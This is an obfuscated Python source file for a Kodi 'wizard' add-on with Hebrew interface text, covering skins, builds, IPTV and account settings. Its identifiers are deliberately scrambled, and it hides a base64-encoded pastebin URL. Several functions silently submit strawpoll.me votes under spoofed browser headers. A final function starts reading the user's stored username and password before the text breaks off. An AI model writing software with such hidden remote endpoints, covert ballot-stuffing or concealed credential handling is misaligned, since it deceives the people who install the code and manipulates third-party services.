# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:41
ADDONTITLE =uservar .ADDONTITLE #line:42
ADDON =wiz .addonId (ADDON_ID )#line:43
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:44
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:45
DIALOG =xbmcgui .Dialog ()#line:46
DP =xbmcgui .DialogProgress ()#line:47
HOME =xbmc .translatePath ('special://home/')#line:48
LOG =xbmc .translatePath ('special://logpath/')#line:49
PROFILE =xbmc .translatePath ('special://profile/')#line:50
ADDONS =os .path .join (HOME ,'addons')#line:51
USERDATA =os .path .join (HOME ,'userdata')#line:52
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:53
PACKAGES =os .path .join (ADDONS ,'packages')#line:54
ADDOND =os .path .join (USERDATA ,'addon_data')#line:55
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:56
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:57
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:58
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:59
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:60
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:61
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:62
DATABASE =os .path .join (USERDATA ,'Database')#line:63
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:64
ICON =os .path .join (ADDONPATH ,'icon.png')#line:65
ART =os .path .join (ADDONPATH ,'resources','art')#line:66
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:67
DP2 =xbmcgui .DialogProgressBG ()#line:68
SKIN =xbmc .getSkinDir ()#line:69
BUILDNAME =wiz .getS ('buildname')#line:70
DEFAULTSKIN =wiz .getS ('defaultskin')#line:71
DEFAULTNAME =wiz .getS ('defaultskinname')#line:72
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:73
BUILDVERSION =wiz .getS ('buildversion')#line:74
BUILDTHEME =wiz .getS ('buildtheme')#line:75
BUILDLATEST =wiz .getS ('latestversion')#line:76
INSTALLMETHOD =wiz .getS ('installmethod')#line:77
SHOW15 =wiz .getS ('show15')#line:78
SHOW16 =wiz .getS ('show16')#line:79
SHOW17 =wiz .getS ('show17')#line:80
SHOW18 =wiz .getS ('show18')#line:81
SHOWADULT =wiz .getS ('adult')#line:82
SHOWMAINT =wiz .getS ('showmaint')#line:83
AUTOCLEANUP =wiz .getS ('autoclean')#line:84
AUTOCACHE =wiz .getS ('clearcache')#line:85
AUTOPACKAGES =wiz .getS ('clearpackages')#line:86
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:87
AUTOFEQ =wiz .getS ('autocleanfeq')#line:88
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:89
INCLUDENAN =wiz .getS ('includenan')#line:90
INCLUDEURL =wiz .getS ('includeurl')#line:91
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:92
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:93
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:94
INCLUDEVIDEO =wiz .getS ('includevideo')#line:95
INCLUDEALL =wiz .getS ('includeall')#line:96
INCLUDEBOB =wiz .getS ('includebob')#line:97
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:98
INCLUDESPECTO =wiz .getS ('includespecto')#line:99
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:100
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:101
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:102
INCLUDESALTS =wiz .getS ('includesalts')#line:103
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:104
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:105
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:106
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:107
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:108
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:109
INCLUDEURANUS =wiz .getS ('includeuranus')#line:110
SEPERATE =wiz .getS ('seperate')#line:111
NOTIFY =wiz .getS ('notify')#line:112
NOTEDISMISS =wiz .getS ('notedismiss')#line:113
NOTEID =wiz .getS ('noteid')#line:114
NOTIFY2 =wiz .getS ('notify2')#line:115
NOTEID2 =wiz .getS ('noteid2')#line:116
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:117
NOTIFY3 =wiz .getS ('notify3')#line:118
NOTEID3 =wiz .getS ('noteid3')#line:119
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:120
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:121
TRAKTSAVE =wiz .getS ('traktlastsave')#line:122
REALSAVE =wiz .getS ('debridlastsave')#line:123
LOGINSAVE =wiz .getS ('loginlastsave')#line:124
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:125
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:126
KEEPINFO =wiz .getS ('keepinfo')#line:127
KEEPSOUND =wiz .getS ('keepsound')#line:129
KEEPVIEW =wiz .getS ('keepview')#line:130
KEEPSKIN =wiz .getS ('keepskin')#line:131
KEEPADDONS =wiz .getS ('keepaddons')#line:132
KEEPSKIN2 =wiz .getS ('keepskin2')#line:133
KEEPSKIN3 =wiz .getS ('keepskin3')#line:134
KEEPTORNET =wiz .getS ('keeptornet')#line:135
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:136
KEEPPVR =wiz .getS ('keeppvr')#line:137
ENABLE =uservar .ENABLE #line:138
KEEPVICTORY =wiz .getS ('keepvictory')#line:139
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:140
KEEPTVLIST =wiz .getS ('keeptvlist')#line:141
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:142
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:143
KEEPHUBTV =wiz .getS ('keephubtv')#line:144
KEEPHUBVOD =wiz .getS ('keephubvod')#line:145
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:146
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:147
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:148
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:149
HARDWAER =wiz .getS ('action')#line:150
USERNAME =wiz .getS ('user')#line:151
PASSWORD =wiz .getS ('pass')#line:152
KEEPWEATHER =wiz .getS ('keepweather')#line:153
KEEPFAVS =wiz .getS ('keepfavourites')#line:154
KEEPSOURCES =wiz .getS ('keepsources')#line:155
KEEPPROFILES =wiz .getS ('keepprofiles')#line:156
KEEPADVANCED =wiz .getS ('keepadvanced')#line:157
KEEPREPOS =wiz .getS ('keeprepos')#line:158
KEEPSUPER =wiz .getS ('keepsuper')#line:159
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:160
KEEPTRAKT =wiz .getS ('keeptrakt')#line:161
KEEPREAL =wiz .getS ('keepdebrid')#line:162
KEEPRD2 =wiz .getS ('keeprd2')#line:163
KEEPLOGIN =wiz .getS ('keeplogin')#line:164
LOGINSAVE =wiz .getS ('loginlastsave')#line:165
DEVELOPER =wiz .getS ('developer')#line:166
THIRDPARTY =wiz .getS ('enable3rd')#line:167
THIRD1NAME =wiz .getS ('wizard1name')#line:168
THIRD1URL =wiz .getS ('wizard1url')#line:169
THIRD2NAME =wiz .getS ('wizard2name')#line:170
THIRD2URL =wiz .getS ('wizard2url')#line:171
THIRD3NAME =wiz .getS ('wizard3name')#line:172
THIRD3URL =wiz .getS ('wizard3url')#line:173
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:174
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:175
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:176
TODAY =date .today ()#line:177
TOMORROW =TODAY +timedelta (days =1 )#line:178
THREEDAYS =TODAY +timedelta (days =3 )#line:179
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:180
MCNAME =wiz .mediaCenter ()#line:181
EXCLUDES =uservar .EXCLUDES #line:182
SPEEDFILE =speedtest .SPEEDFILE #line:183
APKFILE =uservar .APKFILE #line:184
YOUTUBETITLE =uservar .YOUTUBETITLE #line:185
YOUTUBEFILE =uservar .YOUTUBEFILE #line:186
SPEED =speedtest .SPEED #line:187
UNAME =speedtest .UNAME #line:188
ADDONFILE =uservar .ADDONFILE #line:189
ADVANCEDFILE =uservar .ADVANCEDFILE #line:190
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:191
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:192
NOTIFICATION =uservar .NOTIFICATION #line:193
NOTIFICATION2 =uservar .NOTIFICATION2 #line:194
NOTIFICATION3 =uservar .NOTIFICATION3 #line:195
HELPINFO =uservar .HELPINFO #line:196
ENABLE =uservar .ENABLE #line:197
HEADERMESSAGE =uservar .HEADERMESSAGE #line:198
AUTOUPDATE =uservar .AUTOUPDATE #line:199
WIZARDFILE =uservar .WIZARDFILE #line:200
HIDECONTACT =uservar .HIDECONTACT #line:201
SKINID18 =uservar .SKINID18 #line:202
SKINID18DDONXML =uservar .SKINID18DDONXML #line:203
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:204
SKINID17 =uservar .SKINID17 #line:205
SKINID17DDONXML =uservar .SKINID17DDONXML #line:206
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:207
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:208
CONTACT =uservar .CONTACT #line:209
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:210
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:211
HIDESPACERS =uservar .HIDESPACERS #line:212
TMDB_NEW_API =uservar .TMDB_NEW_API #line:213
COLOR1 =uservar .COLOR1 #line:214
COLOR2 =uservar .COLOR2 #line:215
THEME1 =uservar .THEME1 #line:216
THEME2 =uservar .THEME2 #line:217
THEME3 =uservar .THEME3 #line:218
THEME4 =uservar .THEME4 #line:219
THEME5 =uservar .THEME5 #line:220
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:222
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:223
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:224
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:225
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:226
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:227
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:228
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:229
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:230
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:231
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:232
LOGFILES =wiz .LOGFILES #line:233
TRAKTID =traktit .TRAKTID #line:234
DEBRIDID =debridit .DEBRIDID #line:235
LOGINID =loginit .LOGINID #line:236
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:237
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:238
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:239
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:240
fullsecfold =xbmc .translatePath ('special://home')#line:241
addons_folder =os .path .join (fullsecfold ,'addons')#line:243
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:245
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:247
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:249
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:250
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:251
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:254
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:255
def MainMenu ():#line:262
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:264
def skinWIN ():#line:265
	idle ()#line:266
	OOO00O0OO00OOOOOO =glob .glob (os .path .join (ADDONS ,'skin*'))#line:267
	OO0O0OOO0O00OOO00 =[];O00O0OO0O0O000OO0 =[]#line:268
	for OOO00000OOOO000O0 in sorted (OOO00O0OO00OOOOOO ,key =lambda OO0OO0O00OO000O00 :OO0OO0O00OO000O00 ):#line:269
		O0O0OO000OO0OO0O0 =os .path .split (OOO00000OOOO000O0 [:-1 ])[1 ]#line:270
		O0OO00O0OO0OOO0O0 =os .path .join (OOO00000OOOO000O0 ,'addon.xml')#line:271
		if os .path .exists (O0OO00O0OO0OOO0O0 ):#line:272
			OOOOO0O0000OOO000 =open (O0OO00O0OO0OOO0O0 )#line:273
			O00OO00000OOO0OO0 =OOOOO0O0000OOO000 .read ()#line:274
			O0000OO0O0OOO00OO =parseDOM2 (O00OO00000OOO0OO0 ,'addon',ret ='id')#line:275
			O000O00OO0O0O0O00 =O0O0OO000OO0OO0O0 if len (O0000OO0O0OOO00OO )==0 else O0000OO0O0OOO00OO [0 ]#line:276
			try :#line:277
				O0OOOOO00O0000000 =xbmcaddon .Addon (id =O000O00OO0O0O0O00 )#line:278
				OO0O0OOO0O00OOO00 .append (O0OOOOO00O0000000 .getAddonInfo ('name'))#line:279
				O00O0OO0O0O000OO0 .append (O000O00OO0O0O0O00 )#line:280
			except :#line:281
				pass #line:282
	O0OOO000O00O00OO0 =[];O00OOOOOOOOO000OO =0 #line:283
	OO0OO0OO0OO00OO00 =["Current Skin -- %s"%currSkin ()]+OO0O0OOO0O00OOO00 #line:284
	O00OOOOOOOOO000OO =DIALOG .select ("Select the Skin you want to swap with.",OO0OO0OO0OO00OO00 )#line:285
	if O00OOOOOOOOO000OO ==-1 :return #line:286
	else :#line:287
		OOO000O0O00O0O000 =(O00OOOOOOOOO000OO -1 )#line:288
		O0OOO000O00O00OO0 .append (OOO000O0O00O0O000 )#line:289
		OO0OO0OO0OO00OO00 [O00OOOOOOOOO000OO ]="%s"%(OO0O0OOO0O00OOO00 [OOO000O0O00O0O000 ])#line:290
	if O0OOO000O00O00OO0 ==None :return #line:291
	for OOOOOOO00OO0O0OO0 in O0OOO000O00O00OO0 :#line:292
		swapSkins (O00O0OO0O0O000OO0 [OOOOOOO00OO0O0OO0 ])#line:293
def currSkin ():#line:295
	return xbmc .getSkinDir ('Container.PluginName')#line:296
def swapSkins (OOO00O0OO0O0O0OOO ,title ="Error"):#line:297
	OO00OO0O0OO0O0OO0 ='lookandfeel.skin'#line:298
	OOOOO00OOO00OO0O0 =OOO00O0OO0O0O0OOO #line:299
	O00000O0O000O0OO0 =getOld (OO00OO0O0OO0O0OO0 )#line:300
	O0OO0OO000O00O0OO =OO00OO0O0OO0O0OO0 #line:301
	setNew (O0OO0OO000O00O0OO ,OOOOO00OOO00OO0O0 )#line:302
	O0OOOO00O00OOOO0O =0 #line:303
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OOOO00O00OOOO0O <100 :#line:304
		O0OOOO00O00OOOO0O +=1 #line:305
		xbmc .sleep (1 )#line:306
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:307
		xbmc .executebuiltin ('SendClick(11)')#line:308
	return True #line:309
def getOld (OO0O00O0O00O0OOOO ):#line:311
	try :#line:312
		OO0O00O0O00O0OOOO ='"%s"'%OO0O00O0O00O0OOOO #line:313
		OO00O00OO00OO0O00 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OO0O00O0O00O0OOOO )#line:314
		O0OO0OOO0OOO00000 =xbmc .executeJSONRPC (OO00O00OO00OO0O00 )#line:316
		O0OO0OOO0OOO00000 =simplejson .loads (O0OO0OOO0OOO00000 )#line:317
		if O0OO0OOO0OOO00000 .has_key ('result'):#line:318
			if O0OO0OOO0OOO00000 ['result'].has_key ('value'):#line:319
				return O0OO0OOO0OOO00000 ['result']['value']#line:320
	except :#line:321
		pass #line:322
	return None #line:323
def setNew (O0000O000O00O0O00 ,O0OO00000O0O0O000 ):#line:326
	try :#line:327
		O0000O000O00O0O00 ='"%s"'%O0000O000O00O0O00 #line:328
		O0OO00000O0O0O000 ='"%s"'%O0OO00000O0O0O000 #line:329
		OOO00OOO00OOOOOO0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O0000O000O00O0O00 ,O0OO00000O0O0O000 )#line:330
		O0OO0O0OOO00000OO =xbmc .executeJSONRPC (OOO00OOO00OOOOOO0 )#line:332
	except :#line:333
		pass #line:334
	return None #line:335
def idle ():#line:336
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:337
def resetkodi ():#line:339
		if xbmc .getCondVisibility ('system.platform.windows'):#line:340
			OO0OO0OOO0O00000O =xbmcgui .DialogProgress ()#line:341
			OO0OO0OOO0O00000O .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:344
			OO0OO0OOO0O00000O .update (0 )#line:345
			for OO0O0OOOO0O00OOO0 in range (5 ,-1 ,-1 ):#line:346
				time .sleep (1 )#line:347
				OO0OO0OOO0O00000O .update (int ((5 -OO0O0OOOO0O00OOO0 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OO0O0OOOO0O00OOO0 ),'')#line:348
				if OO0OO0OOO0O00000O .iscanceled ():#line:349
					from resources .libs import win #line:350
					return None ,None #line:351
			from resources .libs import win #line:352
		else :#line:353
			OO0OO0OOO0O00000O =xbmcgui .DialogProgress ()#line:354
			OO0OO0OOO0O00000O .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:357
			OO0OO0OOO0O00000O .update (0 )#line:358
			for OO0O0OOOO0O00OOO0 in range (5 ,-1 ,-1 ):#line:359
				time .sleep (1 )#line:360
				OO0OO0OOO0O00000O .update (int ((5 -OO0O0OOOO0O00OOO0 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OO0O0OOOO0O00OOO0 ),'')#line:361
				if OO0OO0OOO0O00000O .iscanceled ():#line:362
					os ._exit (1 )#line:363
					return None ,None #line:364
			os ._exit (1 )#line:365
def backtokodi ():#line:367
			wiz .kodi17Fix ()#line:368
			fix18update ()#line:369
			fix17update ()#line:370
def testcommand1 ():#line:372
    import requests #line:373
    O0OOOOOO0O000O000 ='18773068'#line:374
    O0O00O0OO00OOOO0O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0OOOOOO0O000O000 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:386
    O00O0O000O0O00OO0 ='145273320'#line:388
    O000O0OO0O00O00OO ='145272688'#line:389
    if ADDON .getSetting ("auto_rd")=='true':#line:390
        O0O0O0O000O00O00O =O00O0O000O0O00OO0 #line:391
    else :#line:392
        O0O0O0O000O00O00O =O000O0OO0O00O00OO #line:393
    OOOOO00000OO0OO00 ={'options':O0O0O0O000O00O00O }#line:397
    O000OO0O0OOOO0OO0 =requests .post ('https://www.strawpoll.me/'+O0OOOOOO0O000O000 ,headers =O0O00O0OO00OOOO0O ,data =OOOOO00000OO0OO00 )#line:399
def builde_Votes ():#line:400
   try :#line:401
        import requests #line:402
        OO00O0OO0OOOOOO00 ='18773068'#line:403
        OOOO0OOO0O00OO000 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO00O0OO0OOOOOO00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:415
        OO0O00O0OOOOO0OO0 ='145273320'#line:417
        OOO0OO0O00OOO0O00 ={'options':OO0O00O0OOOOO0OO0 }#line:423
        O00OO00OO0OOOOOOO =requests .post ('https://www.strawpoll.me/'+OO00O0OO0OOOOOO00 ,headers =OOOO0OOO0O00OO000 ,data =OOO0OO0O00OOO0O00 )#line:425
   except :pass #line:426
def update_Votes ():#line:427
   try :#line:428
        import requests #line:429
        O00O00OOOO0O00O00 ='18773068'#line:430
        O000O00O0OOOO00O0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00O00OOOO0O00O00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:442
        O0O0OOOOO0O0O000O ='145273321'#line:444
        O0OOOOO000O0000O0 ={'options':O0O0OOOOO0O0O000O }#line:450
        O0OO000O0O0O0O00O =requests .post ('https://www.strawpoll.me/'+O00O00OOOO0O00O00 ,headers =O000O00O0OOOO00O0 ,data =O0OOOOO000O0000O0 )#line:452
   except :pass #line:453
def testcommand ():#line:457
 O0O0000OOO0OOOOO0 =os .path .dirname (os .path .realpath (__file__ ))#line:458
 O000OOOO0O00OOO0O =os .path .join (O0O0000OOO0OOOOO0 ,'changelog.txt')#line:459
 OOOO0OO00OO0O0OOO =open (O000OOOO0O00OOO0O ,'r')#line:460
 OO0OOOO0O0OOOOOO0 =OOOO0OO00OO0O0OOO .read ()#line:461
 OOOOOO0000O0O0OO0 =OO0OOOO0O0OOOOOO0 #line:462
 notify .updateinfo (OOOOOO0000O0O0OO0 ,True )#line:463
def skin_homeselect ():#line:464
	try :#line:466
		O000O0O000O00O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:467
		OO00O0OO0OO00O0OO =open (O000O0O000O00O0OO ,'r')#line:469
		O00O000O00O0O0O00 =OO00O0OO0OO00O0OO .read ()#line:470
		OO00O0OO0OO00O0OO .close ()#line:471
		O000000OO0OOOO000 ='<setting id="HomeS" type="string(.+?)/setting>'#line:472
		O00O0O0OO0O0OO0O0 =re .compile (O000000OO0OOOO000 ).findall (O00O000O00O0O0O00 )[0 ]#line:473
		OO00O0OO0OO00O0OO =open (O000O0O000O00O0OO ,'w')#line:474
		OO00O0OO0OO00O0OO .write (O00O000O00O0O0O00 .replace ('<setting id="HomeS" type="string%s/setting>'%O00O0O0OO0O0OO0O0 ,'<setting id="HomeS" type="string"></setting>'))#line:475
		OO00O0OO0OO00O0OO .close ()#line:476
	except :#line:477
		pass #line:478
def autotrakt ():#line:481
    O0OO0O0000OO0OO0O =(ADDON .getSetting ("auto_trk"))#line:482
    if O0OO0O0000OO0OO0O =='true':#line:483
       from resources .libs import trk_aut #line:484
def traktsync ():#line:486
     O0OOO00OOO0O0O000 =(ADDON .getSetting ("auto_trk"))#line:487
     if O0OOO00OOO0O0O000 =='true':#line:488
       from resources .libs import trk_aut #line:491
     else :#line:492
        ADDON .openSettings ()#line:493
def imdb_synck ():#line:495
   try :#line:496
     OOOO0O0OO0OO0O0OO =xbmcaddon .Addon ('plugin.video.exodusredux')#line:497
     O00OOO000OOOO0000 =xbmcaddon .Addon ('plugin.video.gaia')#line:498
     O00O0OOO000O0O000 =(ADDON .getSetting ("imdb_sync"))#line:499
     OOOOOOOO0OOOOO0O0 ="imdb.user"#line:500
     OOO00O00O0O0O00OO ="accounts.informants.imdb.user"#line:501
     OOOO0O0OO0OO0O0OO .setSetting (OOOOOOOO0OOOOO0O0 ,str (O00O0OOO000O0O000 ))#line:502
     O00OOO000OOOO0000 .setSetting ('accounts.informants.imdb.enabled','true')#line:503
     O00OOO000OOOO0000 .setSetting (OOO00O00O0O0O00OO ,str (O00O0OOO000O0O000 ))#line:504
   except :pass #line:505
def dis_or_enable_addon (OO00O0OO000O0OO00 ,OO0O0O000000O00O0 ,enable ="true"):#line:507
    import json #line:508
    OOOO0OO000OO00000 ='"%s"'%OO00O0OO000O0OO00 #line:509
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00O0OO000O0OO00 )and enable =="true":#line:510
        logging .warning ('already Enabled')#line:511
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO00O0OO000O0OO00 )#line:512
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00O0OO000O0OO00 )and enable =="false":#line:513
        return xbmc .log ("### Skipped %s, reason = not installed"%OO00O0OO000O0OO00 )#line:514
    else :#line:515
        O00O0000O00OOOOOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OOOO0OO000OO00000 ,enable )#line:516
        O000OO00O0OO00O0O =xbmc .executeJSONRPC (O00O0000O00OOOOOO )#line:517
        O00000000O0OOO00O =json .loads (O000OO00O0OO00O0O )#line:518
        if enable =="true":#line:519
            xbmc .log ("### Enabled %s, response = %s"%(OO00O0OO000O0OO00 ,O00000000O0OOO00O ))#line:520
        else :#line:521
            xbmc .log ("### Disabled %s, response = %s"%(OO00O0OO000O0OO00 ,O00000000O0OOO00O ))#line:522
    if OO0O0O000000O00O0 =='auto':#line:523
     return True #line:524
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:525
def iptvset ():#line:528
  try :#line:529
    O0O0O0O000O000OOO =(ADDON .getSetting ("iptv_on"))#line:530
    if O0O0O0O000O000OOO =='true':#line:532
       if KODIV >=17 and KODIV <18 :#line:534
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:535
         O00000OO00000O00O =xbmcaddon .Addon ('pvr.iptvsimple')#line:536
         O0OO000OOOOO0OOO0 =(ADDON .getSetting ("iptvUrl"))#line:538
         O00000OO00000O00O .setSetting ('m3uUrl',O0OO000OOOOO0OOO0 )#line:539
         OOOOOO0OOO0OOOO0O =(ADDON .getSetting ("epg_Url"))#line:540
         O00000OO00000O00O .setSetting ('epgUrl',OOOOOO0OOO0OOOO0O )#line:541
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:544
         iptvsimpldownpc ()#line:545
         wiz .kodi17Fix ()#line:546
         xbmc .sleep (1000 )#line:547
         O00000OO00000O00O =xbmcaddon .Addon ('pvr.iptvsimple')#line:548
         O0OO000OOOOO0OOO0 =(ADDON .getSetting ("iptvUrl"))#line:549
         O00000OO00000O00O .setSetting ('m3uUrl',O0OO000OOOOO0OOO0 )#line:550
         OOOOOO0OOO0OOOO0O =(ADDON .getSetting ("epg_Url"))#line:551
         O00000OO00000O00O .setSetting ('epgUrl',OOOOOO0OOO0OOOO0O )#line:552
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:554
         iptvsimpldown ()#line:555
         wiz .kodi17Fix ()#line:556
         xbmc .sleep (1000 )#line:557
         O00000OO00000O00O =xbmcaddon .Addon ('pvr.iptvsimple')#line:558
         O0OO000OOOOO0OOO0 =(ADDON .getSetting ("iptvUrl"))#line:559
         O00000OO00000O00O .setSetting ('m3uUrl',O0OO000OOOOO0OOO0 )#line:560
         OOOOOO0OOO0OOOO0O =(ADDON .getSetting ("epg_Url"))#line:561
         O00000OO00000O00O .setSetting ('epgUrl',OOOOOO0OOO0OOOO0O )#line:562
  except :pass #line:563
def howsentlog ():#line:570
       try :#line:571
          import json #line:572
          OO0OOO0OOO0OO00OO =(ADDON .getSetting ("user"))#line:573
          O000O0OO000O0O0O0 =(ADDON .getSetting ("pass"))#line:574
          O00OO0OOOOO000OO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:575
